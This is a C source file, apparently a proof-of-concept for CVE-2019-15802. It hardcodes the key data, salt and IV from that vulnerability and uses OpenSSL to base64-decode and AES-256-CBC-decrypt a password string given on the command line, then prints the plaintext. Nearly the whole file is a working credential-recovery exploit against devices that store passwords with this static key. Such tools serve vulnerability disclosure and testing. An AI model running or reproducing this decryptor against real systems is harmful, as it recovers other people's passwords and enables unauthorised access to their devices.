/*
 * Copyright 2019 Jasper Lievisse Adriaanse <j@jasper.la>
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
 * the Software, and to permit persons to whom the Software is furnished to do so,
 * subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#include <sys/types.h>
#include <string.h>
#include <stdio.h>

#include <openssl/aes.h>
#include <openssl/bio.h>
#include <openssl/evp.h>

#include "decrypt.h"

int
main(int argc, char *argv[]) {
	char *input;
	unsigned char *output;
	size_t len;

	if (argc < 2) {
		printf("[-] Please submit a password to decrypt.\n");
		return 1;
	}

	input = argv[1];

	printf("[*] Provided base64-encoded input: %s\n", input);

	output = decrypt(input);

	if (!output) {
		printf("[-] Failed to decrypt string. Was it encoded with the known parameters?\n");
		return 1;
	}

	printf("[+] Decoded password: %s\n", output);

	return 0;
}

/*
 * Base64 decode and AES-256 CBC decrypt 'idata'.
 */
unsigned char *
decrypt(char *idata)
{
  EVP_CIPHER_CTX *ctx;
  unsigned char *b64decoded, *odata = NULL;
  size_t len = strlen(idata);
  int rc, p_len = len, f_len = 0;
  int rounds = 5;
  int key_size, key_data_len = 64;

  /* The hardcoded parameters of CVE-2019-15802 */
  u_char key[32];
  u_char salt[16] = "1A3BB2F78D6EC7D8";
  u_char iv[32] = "2268BA68768B58C3687D4F205923A741";
  u_char key_data[64] = "EC14D4F5BC6B9A3766D31EF9A1BB854121FB938B606462C70B2D0E26549C486A";

  key_size = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha1(), salt, key_data, key_data_len, rounds, key, iv);

  if (key_size != 32) {
      printf("[-] Key size does not match a 256-bit key");
      return 0;
  }

  ctx = EVP_CIPHER_CTX_new();
  if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
    printf("[-] Failed to setup decryption context.\n");
    return NULL;
  }

  /* Decode the base64-encoded password. */
  if (Base64Decode(idata, &b64decoded, &len) != 0) {
    printf("[-] Decoding failed; possibly an incomplete string provided.\n");
    return NULL;
  }

  /* Allocate memory to contain the plaintext data and add an extra block due to padding. */
  odata = malloc(p_len + AES_BLOCK_SIZE);

  /* Decrypt the data using the available key. */
  EVP_DecryptInit_ex(ctx, NULL, NULL, NULL, NULL);
  EVP_DecryptUpdate(ctx, odata, &p_len, b64decoded, len);
  EVP_DecryptFinal_ex(ctx, odata + p_len, &f_len);

  EVP_CIPHER_CTX_cleanup(ctx);

  return odata;
}
